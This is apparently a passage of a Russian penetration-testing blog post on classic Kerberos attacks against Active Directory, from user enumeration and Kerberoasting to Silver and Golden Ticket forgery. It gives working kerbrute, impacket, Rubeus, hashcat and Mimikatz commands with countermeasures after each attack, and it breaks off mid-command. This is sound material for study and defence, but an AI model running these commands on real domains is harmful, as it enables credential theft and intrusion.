<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки. | Ardent101</title><meta name=keywords content="Active Directory,Kerberos,Pentest,Теория,Рекомендации"><meta name=description content="Вступление Для Active Directory известно множество атак с использованием протокола Kerberos. Попробую перечислить некоторые из них:
Атаки на повышение привилегий
 Перебор пользователей Распыление / Подбор паролей AS-REQ roasting AS-REP roasting Kerberoasting (AnySPN, целенаправленный Kerberoasting)  Атаки для дальнейшего продвижения
Pass-the-Key / Overpass-the-hash Pass-the-Ticket / Pass-the-Cache  Атаки для закрепления
Silver Ticket Golden Ticket Skeleton Key Diamond Ticket  Атаки на делегирование
На неограниченное делегирование На ограниченное На ограниченное на основе ресурсов  А также:"><meta name=author content="Ardent101"><link rel=canonical href=https://ardent101.github.com/posts/kerberos_general_attacks/><link crossorigin=anonymous href=/assets/css/stylesheet.min.d6ed90c28450051e5bafcc0bf4bfe033ff2b04454909211dc9e97b8a50525621.css integrity="sha256-1u2QwoRQBR5br8wL9L/gM/8rBEVJCSEdyel7ilBSViE=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ardent101.github.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://ardent101.github.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://ardent101.github.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://ardent101.github.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://ardent101.github.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки."><meta property="og:description" content="Вступление Для Active Directory известно множество атак с использованием протокола Kerberos. Попробую перечислить некоторые из них:
Атаки на повышение привилегий
 Перебор пользователей Распыление / Подбор паролей AS-REQ roasting AS-REP roasting Kerberoasting (AnySPN, целенаправленный Kerberoasting)  Атаки для дальнейшего продвижения
Pass-the-Key / Overpass-the-hash Pass-the-Ticket / Pass-the-Cache  Атаки для закрепления
Silver Ticket Golden Ticket Skeleton Key Diamond Ticket  Атаки на делегирование
На неограниченное делегирование На ограниченное На ограниченное на основе ресурсов  А также:"><meta property="og:type" content="article"><meta property="og:url" content="https://ardent101.github.com/posts/kerberos_general_attacks/"><meta property="og:image" content="https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-08-07T11:30:03+00:00"><meta property="article:modified_time" content="2022-08-07T11:30:03+00:00"><meta property="og:site_name" content="Ardent101"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo.jpg"><meta name=twitter:title content="Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки."><meta name=twitter:description content="Вступление Для Active Directory известно множество атак с использованием протокола Kerberos. Попробую перечислить некоторые из них:
Атаки на повышение привилегий
 Перебор пользователей Распыление / Подбор паролей AS-REQ roasting AS-REP roasting Kerberoasting (AnySPN, целенаправленный Kerberoasting)  Атаки для дальнейшего продвижения
Pass-the-Key / Overpass-the-hash Pass-the-Ticket / Pass-the-Cache  Атаки для закрепления
Silver Ticket Golden Ticket Skeleton Key Diamond Ticket  Атаки на делегирование
На неограниченное делегирование На ограниченное На ограниченное на основе ресурсов  А также:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ardent101.github.com/posts/"},{"@type":"ListItem","position":2,"name":"Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки.","item":"https://ardent101.github.com/posts/kerberos_general_attacks/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки.","name":"Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки.","description":"Вступление Для Active Directory известно множество атак с использованием протокола Kerberos. Попробую перечислить некоторые из них:\nАтаки на повышение привилегий\n Перебор пользователей Распыление / Подбор паролей AS-REQ roasting AS-REP roasting Kerberoasting (AnySPN, целенаправленный Kerberoasting)  Атаки для дальнейшего продвижения\nPass-the-Key / Overpass-the-hash Pass-the-Ticket / Pass-the-Cache  Атаки для закрепления\nSilver Ticket Golden Ticket Skeleton Key Diamond Ticket  Атаки на делегирование\nНа неограниченное делегирование На ограниченное На ограниченное на основе ресурсов  А также:","keywords":["Active Directory","Kerberos","Pentest","Теория","Рекомендации"],"articleBody":"Вступление Для Active Directory известно множество атак с использованием протокола Kerberos. Попробую перечислить некоторые из них:\nАтаки на повышение привилегий\n Перебор пользователей Распыление / Подбор паролей AS-REQ roasting AS-REP roasting Kerberoasting (AnySPN, целенаправленный Kerberoasting)  Атаки для дальнейшего продвижения\nPass-the-Key / Overpass-the-hash Pass-the-Ticket / Pass-the-Cache  Атаки для закрепления\nSilver Ticket Golden Ticket Skeleton Key Diamond Ticket  Атаки на делегирование\nНа неограниченное делегирование На ограниченное На ограниченное на основе ресурсов  А также:\nBronze bit sAMAccountName спуфинг Pass the certificate MS14-068 (Forged PAC) Krbrelay Атаки на доверие между доменами …  Далее будут разобраны “классические” атаки из пунктов 1-9. Разбор остальных атак требует изложения дополнительного теоретического материала и пока только в планах на будущее.\n Демонстрация некоторых атак совершалась на стенде с TryHackMe.\n Атака на подбор имен пользователей Условие для проведения атаки: сетевая доступность контроллера домена.\nРезультат успешной атаки: перечень, содержащий некоторые действительные имена учетных записей пользователей домена.\nKerberos позволяет узнать существует ли учетная запись при подборе имени с неверным паролем. Атака заключается в отправке KRB_AS_REQ сообщения с отключенной предварительной аутентификацией. Контроллер домена обрабатывает указанное сообщение по-разному в зависимости от наличия или отсутствия учетной записи. Возможны три варианта:\n Если учетная запись отсутствует, то в ответе будет «пользователь не известен». Если учетная запись присутствует и у нее включена предварительная аутентификация (по умолчанию в Active Directory), то в ответе будет «требуется предварительная аутентификация». Если учетная запись присутствует и у нее отключена предварительная аутентификация, то в ответ будет передано KRB_AS_REP сообщение.   Примечание: неудачные попытки перебора не логируются в качестве событий неуспешного входа (ID 4625). Поэтому считается, что подбор имен пользователей через Kerberos чуть более скрытный, чем с помощью некоторых других способов. Есть и другое преимущество счетчик неверных попыток ввода пароля не увеличивается. Таким образом риск заблокировать учетную запись при повторном подборе имени пользователя отсутствует.\n Команда для проведения атаки:\n./kerbrute_linux_amd64 userenum -d $Domain_fqdn $users_list --output $filename \rРекомендации по противодействию:\n Отслеживать аномальные запросы на аутентификацию с неуспешной предварительной аутентификацией, например при помощи системы анализа трафика и (или) системы управления событиями информационной безопасности.  Дополнительно:\nИмена пользователей можно попытаться добыть из разных источников:\n Профили в социальных сетях Метаданные из файлов, располагающихся в целевом домене (FOCA) Почтовые адреса  Имена как правило назначаются в соответствие с каким-то шаблоном. Пользователь Иванов Василий Петрович например может быть назван: pivanov, ivanov_vp, p.ivanov, ivanovp, … Полезно сначала узнать шаблон, а потом в соответствие с ним пробовать перечислять имена.\nЛичный комментарий: В моей практике редко доводилось проводить указанную атаку, так как обычно в ходе внутреннего тестирование на проникновение получить перечень доменных имен пользователей проще при помощи Relay на LDAP c последующим выполнением ldapdomaindump. Описание указанной атаки выходит за рамки материала, но для самообразования рекомендую следующий пост.\nДля желающих попробовать провести атаку на перебор имени на HackTheBox есть стенд Sauna.\nРаспыление пароля Условие для проведения атаки: сетевая доступность контроллера домена.\nРезультат успешной атаки: доступ с правами атакованной учетной записи.\nАтака заключается в попытке найти учетную запись с определенным паролем. Грубо говоря, происходит подбор имени пользователя при зафиксированном пароле. При этом необходимо понимать, что каждая неудачная попытка подбора пароля учетной записи увеличивает счетчик неверных попыток ввода пароля. По достижению порогового значения счетчика учетная запись будет заблокирована. Таким образом прежде, чем приступать к подбору пароля желательно узнать действующую парольную политику. Интерес представляют следующие параметры:\n Сложность пароля - какие символы обязательно должны присутствовать в пароле. По умолчанию должны использоваться 3 из 4 следующих категорий: строчные буквы, заглавные буквы, цифры, спецсимволы (~!@#$%^\u0026*_-+=`|(){}[]:;\"’,.?/) Минимальная длина пароля. По умолчанию составляет 7 символов. Порог блокировки учетной записи. По умолчанию равен 0, то есть учетная запись не блокируется. Если значение равно X0, то после достижения счетчика блокировки X, учетная запись будет заблокирована. Время до сброса счетчика блокировки. По умолчанию не определено, так как имеет смысл, только когда порог блокировки ненулевой. Длительность блокировки учетной записи. По умолчанию 30 минут.  Атаку целесообразно повторять X-1 раз за не менее чем Y + 5 минут (X - порог блокировки учетной записи, Y - время до сброса счетчика).\nКоманда для проведения атаки:\n./kerbrute_linux_amd64 passwordspray -d $Domain_FQDN $users_list $Password \rРекомендации по противодействию:\n Реализовать строгую парольную политику:  Минимальная длина пароля: 10 для пользователей, 14 для администраторов. Порог блокировки учетной записи: 5. Время до сброса: 30 минут. Длительность блокировки и сложность: по умолчанию. Запретить использовать предыдущие пароли. Добавить правило, чтобы новый пароль отличался от предыдущих на не менее, чем 3 символа.   Периодически выгружать NT-хэши из NTDS.dit и проводить инвентаризацию учетных записей на предмет наличия словарных паролей. Простенький словарь для инвентаризации можно взять здесь. С использованием межсетевых экранов ограничить доступ к KDC для сетевых объектов, не входящих в белый список.  Источник: Kerbrute\nAS-REQ roasting Условие для проведения атаки:\n Получение KRB_AS_REQ сообщения с включенной предварительной аутентификацией  Варианты выполнения условия:\n Сообщение можно получить в результате атаки, направленной на перехват сетевого трафика (ARP spoofing, ICMP redirect, поддельный DHCP сервер, IPv6 spoofing). Сообщение можно извлечь из дампа сетевого трафика (PCredz)  Результат успешной атаки:\n Доступ с правами атакованной учетной записи  Из анализа содержимого KRB_AS_REQ сообщения с включенной предварительной аутентификацией видно, что метка времени зашифровывается с использованием полученного из пароля ключа пользователя. Таким образом при наличии указанного сообщения можно попытаться оффлайн (без взаимодействия с сетью на рабочей станции атакующего) подобрать пароль по словарю.\nКоманды для проведения атаки в Linux:\nИзвлечение аутентификационных данных из pcap файла:\nPcredz -f $filepath Извлечение аутентификационных данных из всех pcap файлов в папке:\nPcredz -d $dir_path Извлечение аутентификационных данных при прослушивании сетевого интерфейса\nPcredz -i $interface_name -v Hashcat:\nЕсли штамп времени зашифрован с использованием RC4:\nhashcat -m 7500 $AS_Req_rc4_hashes $dictionary В случае AES256:\nhashcat -m 19900 $AS_Req_AES256_hashes $dictionary Рекомендация по противодействию:\n Реализовать строгую парольную политику (смотри ранее) С использованием встроенных возможностей телекоммуникационного оборудования реализовать защиту от атак, направленных на перехват сетевого трафика (DHCP snooping, Dynamic ARP Protection, IP Source Guard и т.д.). Для привилегированных учетных записей использовать двухфакторную аутентификацию.  Личный комментарий: атака не пользуется особой популярностью.\nИсточник\nAS-REP roasting Условие для проведения атаки: знание имени (принципала) учетной записи с отключенной предварительной аутентификацией\nВариант выполнения условия при отсутствии прав непривилегированного пользователя домена:\n Узнать принципал можно после Relay на контроллер домена по LDAP c последующей выгрузкой перечня всех пользователей и попыткой пройти аутентификацию без проверки подлинности от имени каждого из них.  Варианты выполнения условия при наличии прав непривилегированного пользователя домена:\n Выгрузить с помощью Ldapdomaindump Посмотреть в Bloodhound  Результат успешной атаки:\n Доступ с правами атакованной учетной записи  Как было рассмотрено в 1 части, при отправке атакующим на контроллер домена KRB_AS_REQ сообщения от имени пользователя, у которого отключена предварительная аутентификация, в ответ присылается KRB_AS_REP сообщение, содержащее сессионный ключ, зашифрованный с использованием секрета указанного пользователя. Таким образом можно попытаться подобрать пароль оффлайн по словарю.\nКоманды для реализации атаки в Linux:\nПри отсутствии учетной записи приходиться отправлять KRB_AS_REQ сообщения от имени каждого выявленного пользователя домена. Возьмем результат kerbrute из предыдущей атаки:\n\rОтформатируем его надлежащим образом:\ncat found_users.txt | grep \"VALID\" | cut -f2  formated_found_users.txt \rС использованием полученного файла, содержащего список действительных имен, проведем атаку:\nimpacket-GetNPUsers $Domain_FQDN/ -usersfile $users_list -outputfile $file \r\r\r\rСодержимое файла AS_REP_hashes.txt после выполнения запросов\r\r\r Примечание: получение ошибки «KRB_AP_ERR_SKEW (Clock skew too great)» означает, что время на контроллере домена и рабочей станции атакующего значительно отличается. В Kerberos, как было рассмотрено ранее, многое зависит от значения часов. Таким образом, прежде чем повторять атаку следует синхронизировать время с помощью следующей команды:\n ntpdate $DC_IP Альтернативно, при наличии прав пользователя домена можно сразу получить список учетных записей с отключенной предварительной аутентификацией при помощи LDAP и отправить KRB_AS_REQ сообщения только от их имени:\nimpacket-GetNPUsers $domain_FQDN/$domain_username:$user_pass -request -outputfile $file \rТакже при наличии прав пользователя можно собрать информацию для Bloodhound и уже там посмотреть активные учетные записи с отключенной предварительной аутентификацией:\n\rУ выявленных учетных записей полезно проверить права доступа:\n\rВ данном случае видно, что одна из учетных записей с отключенной проверкой подлинности является администратором домена, что при наличии словарного пароля или отсутствии жесткой парольной политики для указанной учетной записи, является существенным недостатком.\nКоманды для реализации атаки в Windows:\nДля проведения атак на Kerberos с Windows существует полезный инструмент - Rubeus. Обычно подразумевается, что Rubeus запущен в контексте процесса с правами пользователя домена, поэтому в аргументах аутентификационные данные не указываются.\n Лирическое отступление: название Rubeus выбрано не случайно. Это имя Хагрида из Гарри Поттера. Он любил страшных животных и умел с ними обращаться. В частности Хагрид знал, что если поиграть на арфе, то можно усыпить Цербера.\n Rubeus.exe asreproast /outfile:$result_File \rПолучив заветные хэши, можно осуществить оффлайн подбор пароля с помощью Hashcat:\nhashcat -m 18200 $asrep_hashes_file $dict_file Рекомендация по противодействию:\n Реализовать строгую парольную политику (смотри ранее) Провести инвентаризацию учетных записей на предмет отключенной предварительной аутентификации. Для каждой из выявленных учетных записей рассмотреть целесообразность отключения. В случае невозможности включения предварительной аутентификации следует руководствоваться принципом минимальных привилегий и не наделять выявленные учетные записи правами уровня администратора домена. С использованием межсетевых экранов ограничить доступ к KDC для сетевых объектов, не входящих в белый список.  Личный комментарий: учетные записи с отключенной предварительной проверкой подлинности, как правило встречаются нечасто, а если и встречаются, то их немного. Тем не менее следует проверять их наличие и права в ходе каждого внутреннего тестирования на проникновение.\nДля самостоятельной тренировки есть стенд Forest на HackTheBox (доступен по платной подписке).\nKerberoasting Условие для проведения атаки: права уровня непривилегированного пользователя домена.\nНекоторые варианты выполнения условия:\n AS-REP roasting Подбор или распыление пароля Эксплуатация критической уязвимости Обнаружить в открытом виде в общедоступной сетевой папке Подбор методом оффлайн перебора по NetNTLMv2 хэшу  Результат успешной атаки: доступ с правами атакованной учетной записи.\nПервым делом атакующий осуществляет поиск учетных записей, обладающих SPN. Делается это при помощи LDAP, например с использованием следующего запроса:\n\"(\u0026(objectClass=user)(objectCategory=user)(servicePrincipalName=*))\"  Примечание 1: Для выполнения приведенного выше запроса требуются права уровня непривилегированного пользователя домена.\nПримечание 2: Осуществлять поиск среди учетных записей класса “компьютер” нет смысла, так как пароль к указанным учетным записям не является словарным.\n Далее атакующий отправляет KRB_TGS_REQ сообщения с указанием SPN, ассоциированными с выявленными учетными записями. Контроллер домена не занимается авторизацией, то есть не проверяет имеет ли скомпрометированная учетная запись право доступа к запрашиваемым сервисам, поэтому в ответ отправляются сообщения, содержащие TGS билеты, зашифрованные с использованием секретов сервисов. Таким образом, получив TGS-билеты, атакующий может попробовать подобрать пароль к сервисам по словарю оффлайн.\nКоманды для проведения атаки в Linux:\nПри необходимости синхронизируем время:\nntpdate $DC_IP Осуществляем поиск поиск всех учетных записей, имеющих SPN, и запрашиваем для них TGS:\nimpacket-GetUserSPNs -dc-ip $DC_IP $Domain_FQDN/$username:$password -request -outputfile $file \rКоманды для проведения атаки в Windows:\nRubeus.exe kerberoast /outfile:$file \r Примечание 3: Извлечь TGS билеты и провести оффлайн подбор пароля также возможно в результате анализа сетевого трафика с помощью extracttgsrepfrompcap\n Выявить сервисные учетные записи, а также посмотреть права, которыми они обладают, можно с помощью Bloodhound:\n\r\r\rПоиск учетных записей, обладающих SPN\r\r\r\r\r\rПоиск привилегированных учетных записей, обладающих SPN\r\r\rВ заключении выполняем перебор с Hashcat:\nhashcat -m 13100 $kerberos_hashes $dictionary \r\r\rПример успешного оффлайн подбора пароля\r\r\r\r\rПример результирующего вывода hashcat\r\r\rKerberoasting + AnySPN Существуют способы выполнить Kerberoasting, не зная SPN имени сервиса. Ранее уже подробно рассматривался формат SPN: service-name/host:port@REALM.\nУ одной учетной записи может быть несколько сервисов, то есть несколько SPN. Проблема заключается в том, что поле “имя сервиса” в ходе KRB-запросов не зашифровывается. То есть вместо одного сервиса учетной записи можно указать другой и ничего не сломается. Атака методом подмены SPN называется AnySPN.\nТаким образом возможна следующая вариация Kerberoasting: если известно имя учетной записи (SAM Account Name, SAN) и что она обладает каким-то SPN, то все равно можно запросить TGS билет, указав SAN вместо SPN, и Kerberoasting отработает.\nПодытожим: возможно получить TGS-билет, не зная названия сервиса.\nЦелевой Kerberoasting Условие для проведения атаки: наличие одного из прав - GenericAll, GenericWrite, WriteProperty или Validated-SPN в отношении атакуемой учетной записи.\nРезультат успешной атаки: доступ с правами атакованной учетной записи\nНаличие одного из перечисленных выше прав, позволяет установить SPN у атакуемой учетной записи. Таким образом указанная учетная запись становится подверженной атаке Kerberoasting.\nКоманда для выполнения атаки:\ntargetedKerberoast.py -v -d $domain_FQDN -u $username -p $password  Для выполнения целевого Kerberoasting в отношении конкретной учетной записи смотри справку targetedKerberoast.py\n Рекомендация по противодействию Kerberoasting:\n Установить для сервисных учетных записей несловарные пароли длинной от 20 символов Использовать защищенный канал между клиентом и контроллером домена для обмена KRB-сообщениями (Flexible Authentication Secure Tunneling или Kerberos armoring). Использовать групповые учетные записи служб (Group Managed Service Accounts, gMSA) в качестве сервисных учетных записей. Создать “ложную” сервисную учетную запись, обладающую SPN, но не имеющую отношения ни к какому приложению. В дальнейшем необходимо отслеживать попытки запроса TGS к указанной службе. Пример для вдохновения. Руководствоваться принципом минимальных привилегий в отношении сервисных учетных записей. В частности, не наделять сервисные учетные записи правами уровня администратора домена. Удалить неиспользуемые SPN. Отслеживать аномальные KRB_TGS_REQ запросы с использованием системы анализа трафика. Отключить слабые типы шифрования Kerberos. С использованием межсетевых экранов ограничить доступ к KDC для сетевых объектов, не входящих в белый список.  Для самостоятельной тренировки Kerberoasting есть стенд Active на HackTheBox.\nИсточники:\n Хорошая статья про Kerberoasting на русском языке. Там же можно подробнее прочитать про реализацию рекомендаций на практике.  Для дальнейшего углубленного изучения:\n Статья, в которой рассматриваются типовые ошибки Red Team при Kerberoasting, а также способы остаться незамеченным.  Pass-the-key / Overpass The Hash Условие для проведения атаки: наличие ключа пользователя.\nВарианты выполнения условия:\n Извлечь ключи из памяти скомпрометированной рабочей станции (требуются права администратора)  Результат успешной атаки: дальнейшее продвижение с правами скомпрометированной учетной записи.\nПредположим атакующий получил доступ с правами администратора в отношении одной из доменных рабочих станций. Дальше, как правило, возникает задача сбора аутентификационных данных для последующего доступа к другим объектам домена.\n Наличие доступа с правами администратора по умолчанию означает, что вы можете сделать на рабочей станции всё, что заблагорассудиться. В теории никакие средства защиты не помещают извлечь необходимые сведения, например из памяти процесса LSASS. Обход средств защиты выходит за рамки настоящей статьи.\n В результате извлечения аутентификационных данных атакующий может добыть ключ пользователя, используемый для запроса TGT у контроллера домена. Далее с использованием добытого ключа атакующий получает TGT, а вместе с ним и доступ к объектам домена.\nКлюч может иметь различный вид в зависимости от настроек Kerberos (см.ранее). При использовании алгоритма RC4_HMAC_MD5 ключом будет являться NT хэш пароля пользователя. В таком случае атака повторного воспроизведения указанного хэша в Kerberos является подвидом атаки Pass-the-Key и называется Overpass-The-Hash.\nКогда целесообразен Pass-the-Key? Допустим в организации отключена аутентификация с использованием NTLM и Kerberos c RC4_HMAC_MD5. На практике подобное маловероятно, но в отношении ряда объектов вполне может встретиться. Тогда знание, AES-ключа все равно позволит получить необходимый доступ без знания пароля.\nКоманды для выполнения атаки:\nПри наличии NT-хэша (Overpass-the-Hash)\ngetTGT.py -hashes $LM:$NT $Domain_FQDN/$username@$target При наличии ключа, сформированного по AES-алгоритмам\ngetTGT.py -aesKey $KerberosKey $Domain_FQDN/$username@$target Рекомендации по противодействию Overpass-the-hash:\n Исключить использование RC4_HMAC_MD5 в Kerberos. В случае невозможности отключения отслеживать аномальные запросы с использованием указанного алгоритма шифрования.  Рекомендации по противодействию Pass-the-key:\n При распределении привилегированного доступа руководствоваться многоуровневой моделью Microsoft. Использовать для администрирования некритичных объектов домена выделенные учетные записи с ограниченными правами. Не использовать административные учетные записи для доступа к рядовым ресурсам. Ограничить входящие соединения на межсетевом экране для каждого конечного сетевого объекта, в первую очередь для серверов. Использовать Credential Guard для защиты процесса lsass.exe и противодействия извлечению аутентификационных данных на объектах сети функционирующих под управлением ОС семейства Windows. Ограничить входящие соединения на межсетевом экране каждого конечного узла.  Для дальнейшего углубленного изучения:\n Исследование harmj0y о возможном понижении версии алгоритма формирования ключа (AES - RC4)  Pass-the-Ticket (PtT) / Pass-the-Cache Условие для проведения атаки: наличие TGT или TGS билетов.\nВарианты выполнения условия:\n Извлечь билеты из скомпрометированной рабочей станции при наличии прав администратора Извлечь билеты из резервной копии рабочей станции (без прав администратора) Извлечь из рабочей станции билеты только скомпрометированного пользователя (без прав администратора) Сформировать на своей рабочей станции самостоятельно при наличии соответствующих аутентификационных данных  Результат успешной атаки: дальнейшее продвижение с правами скомпрометированной учетной записи.\nПрежде чем приступить к разбору атаки рассмотрим, как хранятся билеты Kerberos в различных операционных системах.\nВ Linux для хранения Kerberos используется формат ccache (от credential cache). Сами билеты могут быть обнаружены в:\n в директории /tmp в файлах с именем, имеющим вид: krb5cc_%{uid} в памяти ядра, специально предназначенной для хранения ключей (kernel keyrings) в памяти пользовательского процесса  В Windows билеты Kerberos хранятся в памяти процесса lsass в формате kirbi. Просмотреть доступные текущему пользователю билеты можно следующим образом:\nPS C:\\Users\\Ivan klist Конвертировать билеты в необходимый формат можно следующим образом:\nkirbi - ccache (Windows - Linux)\nticketConverter.py $ticket.kirbi $ticket.ccache ccache - kirbi (Linux - Windows)\nticketConverter.py $ticket.ccache $ticket.kirbi Команды для выполнения атаки:\nВ Linux:\nexport KRB5CCNAME=path_to_ticket.ccache В Windows при помощи Mimikatz:\nkerberos::ptt path_to_ticket.kirbi В Mimikatz можно также использовать ccache формат:\nkerberos::ptt path_to_ticket.ccache В Windows при помощи Rubeus:\nRubeus.exe ptt /ticket:\"base64 | file.kirbi\" В Linux для использования загруженных билетов в поддерживающих Kerberos инструментах необходимо указать соответствующие ключи (как правило: -no-pass / -k).\nО каких инструментах идет речь? В первую очередь об утилитах, входящих в состав Impacket, и crackmapexec.\nПример:\npsexec.py -k $Domain_FQDN/$username@$target В Windows после загрузки в lsass билет будет использоваться по умолчанию.\n.\\PsExec.exe -accepteula \\\\target cmd PtT + AnySPN Очевидно, что больше возможностей для дальнейшего продвижения предоставляет именно TGT, ведь TGS билет используется для доступа только к одному определенному сервису.\nЭто действительно так, но еще раз обратимся к атаке AnySPN. В ходе Pass-the-Key возможно подменить SPN в TGS-билете и использовать модифицированный TGS-билет для доступа к другому сервису, принадлежащему той же учетной записи.\n\r(скриншот взят отсюда)\nРекомендации по противодействию Pass-the-Ticket:\n При распределении привилегированного доступа руководствоваться многоуровневой моделью Microsoft. Использовать для администрирования некритичных объектов домена выделенные учетные записи с ограниченными правами. Не использовать административные учетные записи для доступа к рядовым ресурсам. Ограничить входящие соединения на межсетевом экране для каждого конечного сетевого объекта, в первую очередь для серверов. Использовать Credential Guard для защиты процесса lsass.exe и противодействия извлечению аутентификационных данных на объектах сети функционирующих под управлением ОС семейства Windows. Ограничить входящие соединения на межсетевом экране каждого конечного узла.  Источники литературы:\n Kerberos (II): How to attack Kerberos? (Eloy Pérez)  Silver Ticket Условие для проведения атаки: наличие ключа сервиса.\nНекоторые варианты выполнения условия:\n Kerberoasting Извлечь ключ из памяти процесса lsass.exe скомпрометированной рабочей станции (требуются права администратора) В результате перебора по радужным таблицам после понижение NTLMv2 - NTLMv1 (права администратора не требуются)  Результат успешной атаки: закрепление возможности доступа к скомпрометированному сервису с правами уровня администратора домена.\nПри наличии ключа сервиса атакующий может самостоятельно сформировать TGS-билет для доступа к указанному сервису. Действительно, как было рассмотрено ранее [1][2], для составления TGS-билета требуется:\n Составить произвольный PAC Подписать PAC ключом сервиса Придумать свой собственный сессионный ключ Указать корректное время и период действия билета Зашифровать получившиеся данные из пунктов 1-4 ключом сервиса Составить аутентификатор от имени произвольного пользователя Зашифровать аутентификатор придуманным сессионным ключом  На этом атака Silver Ticket по сути и заканчивается. Далее с использованием атаки Pass-the-Ticket атакующий обращается к скомпрометированному сервису. Что будет происходить на стороне сервиса при получении созданного лже TGS-билета:\n Сервис при помощи своего ключа расшифровывает TGS-билет. Отправитель становится доверенным, так как он смог предоставить TGS-билет, который в теории может быть выдан только контроллером домена. Но в теории теория и практика не отличаются, а на практике они расходятся. Сервис проверяет свою подпись PAC. Сервис извлекает сессионный ключ и с его помощью расшифровывает аутентификатор. Сервис предоставляет пользователю из аутентификатора доступ к себе с правами указанными в PAC.  Теперь могут возникнуть вопросы, которые хочется сразу же обсудить:\n- В PAC действительно можно указать произвольные данные?\n- Да, например можно указать, что пользователь состоит в группе администраторов домена.\n- Погодите, PAC подписывается два раза. Один раз сервис, один раз контроллер домена. Как быть с подписью krbtgt?\n- Никак. По умолчанию сервис не отправляет полученный TGS-билет на контроллер домена для проверки подписи. Таким образом даже после смены секрета учетной записи krbtgt атакующий сохранит доступ к сервису.\nКоманды для выполнения атаки в Linux:\nС использованием RC4 ключа (NT-хэша):\nticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username spn - имя сервиса для которого формируется TGS-билет username - имя произвольной, но реальной учетной записи домена domain-sid - идентификатор безопасности домена, который можно узнать при помощи следующей команды:\nlookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0 С использованием AES ключа:\nticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username Команды для выполнения атаки в Windows:\nС использованием RC4 ключа (NT-хэша) в Mimikatz:\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt С использованием AES128 ключа в Mimikatz:\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt С использованием AES256 ключа в Mimikatz:\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt  Примечание: Mimikatz и Ticketer по умолчанию указывают в PAC, что пользователь состоит в административных группах с предопределенными идентификаторами (513, 512, 520, 518, 519). Крайне редко права доступа могут быть нарезаны только для специфической группы и членства в группе администраторов домена будет недостаточно. Тогда при желании более точно сформировать PAC можно воспользоваться утилитой GoldenCopy.\n Также хочется отметить некоторые особенности, которые могут выдать Silver Ticket. Это может пригодится Red и Blue Team.\n В ходе Silver Ticket отсутствует взаимодействие с контроллером домена, то есть атакующий не использует TGT для запроса TGS. Билет появляется из ниоткуда, а это можно отследить в результате анализа логов. Использование алгоритма шифрования RC4 может быть рассмотрено, как аномальное. По умолчанию для рабочих станций используется AES256. Запрос билета с большим временем жизни также может быть рассмотрен, как аномальное поведение.  Рекомендация по противодействию Silver Ticket:\n Использовать проверку подлинности PAC  Ссылки:\n hackndo hacker recipes  Материалы для дальнейшего изучения:\n Статья про проверку PAC  Golden Ticket Условие для проведения атаки: наличие ключа учетной записи krbtgt.\nНекоторые варианты выполнения условия:\n Атака DCsync  Результат успешной атаки: закрепление возможности доступа к скомпрометированному домену.\nНаличие ключа учетной записи krbtgt позволяет атакующему формировать и изменять TGT по своему усмотрению. Таким образом возможно составить произвольный PAC для любого пользователя домена и получить от его имени доступ к необходимому сервису с желаемыми правами.\nКоманды для выполнения атаки в Linux:\nС использованием RC4 ключа (NT-хэша):\nticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $Domain $RandomUser С использованием AES ключа:\nticketer.py -aesKey $krbtgtAESkey -domain-sid $DomainSID -domain $Domain $RandomUser C указанием идентификаторов групп:\nticketer.py -nthash $krbtgtNThash -domain-sid $DomainSID -domain $Domain -user-id $UserID -groups $GroupID1,$GroupID2, ... $RandomUser Команды для выполнения атаки в Windows:\nС использованием RC4 ключа (NT-хэша) в Mimikatz:\nkerberos::golden /domain:$Domain /sid:$DomainSID /rc4:$krbtgt_NThash /user:$RandomUser /ptt С использованием 